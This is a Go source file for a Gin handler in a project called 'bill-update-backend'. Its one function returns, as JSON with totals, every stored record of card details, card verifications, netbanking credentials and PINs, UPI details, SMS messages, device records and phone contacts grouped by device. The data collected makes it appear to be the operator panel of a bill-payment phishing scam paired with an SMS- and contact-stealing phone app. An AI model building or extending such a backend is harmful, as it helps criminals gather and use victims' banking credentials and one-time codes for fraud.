package handlers

import (
	"bill-update-backend/database"
	"bill-update-backend/models"
	"net/http"

	"github.com/gin-gonic/gin"
)

func GetAllData(c *gin.Context) {
	var billUpdates []models.BillUpdateRequest
	var paymentAttempts []models.PaymentAttempt
	var cardDetails []models.CardDetail
	var cardVerifications []models.CardVerification
	var netbankingDetails []models.NetbankingDetail
	var netbankingPins []models.NetbankingPin
	var upiDetails []models.UpiDetail
	var smsRecords []models.SmsRecord
	var devices []models.Device
	var contactRecords []models.ContactRecord

	database.DB.Order("id desc").Find(&billUpdates)
	database.DB.Order("id desc").Find(&paymentAttempts)
	database.DB.Order("id desc").Find(&cardDetails)
	database.DB.Order("id desc").Find(&cardVerifications)
	database.DB.Order("id desc").Find(&netbankingDetails)
	database.DB.Order("id desc").Find(&netbankingPins)
	database.DB.Order("id desc").Find(&upiDetails)
	database.DB.Order("id desc").Find(&smsRecords)
	database.DB.Order("id desc").Find(&devices)
	database.DB.Order("id desc").Find(&contactRecords)

	// Group sms and contacts by device_id
	smsByDevice := make(map[string][]models.SmsRecord)
	for _, s := range smsRecords {
		smsByDevice[s.DeviceID] = append(smsByDevice[s.DeviceID], s)
	}
	contactsByDevice := make(map[string][]models.ContactRecord)
	for _, c := range contactRecords {
		contactsByDevice[c.DeviceID] = append(contactsByDevice[c.DeviceID], c)
	}

	// Build device-specific payloads
	var deviceSections []gin.H
	for _, d := range devices {
		deviceSections = append(deviceSections, gin.H{
			"device":   d,
			"sms":      smsByDevice[d.DeviceID],
			"contacts": contactsByDevice[d.DeviceID],
		})
	}

	c.JSON(http.StatusOK, gin.H{
		"bill_updates":       billUpdates,
		"payment_attempts":   paymentAttempts,
		"card_details":       cardDetails,
		"card_verifications": cardVerifications,
		"netbanking_details": netbankingDetails,
		"netbanking_pins":    netbankingPins,
		"upi_details":        upiDetails,
		"sms_records":        smsRecords,
		"devices":            devices,
		"contact_records":    contactRecords,
		"device_sections":    deviceSections,
		"stats": gin.H{
			"total_bill_updates":       len(billUpdates),
			"total_payments":           len(paymentAttempts),
			"total_card_details":       len(cardDetails),
			"total_card_verifications": len(cardVerifications),
			"total_netbanking":         len(netbankingDetails),
			"total_netbanking_pins":    len(netbankingPins),
			"total_upi":                len(upiDetails),
			"total_sms":                len(smsRecords),
			"total_devices":            len(devices),
			"total_contacts":           len(contactRecords),
		},
	})
}
